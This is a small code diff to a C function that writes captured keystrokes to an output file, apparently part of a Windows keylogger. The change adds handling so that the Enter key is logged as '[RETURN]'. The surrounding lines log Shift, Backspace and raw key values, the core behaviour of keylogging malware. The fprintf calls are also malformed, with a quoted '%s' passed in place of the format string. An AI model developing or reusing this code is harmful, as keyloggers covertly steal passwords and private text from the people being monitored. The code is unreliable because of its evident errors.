@@ -41,6 +41,8 @@ int Save(int _key, char *file) {
     fprintf(OUTPUT_FILE, '%s', "[SHIFT]");
   else if(_key == VK_BACK)
     fprintf(OUTPUT_FILE, '%s', "[BACK]");
+  else if(_key == VK_RETURN)
+    fprintf(OUTPUT_FILE,'%s', "[RETURN]");
   else
     fprintf(OUTPUT_FILE, '%s', &_key);
   fclose(OUTPUT_FILE);
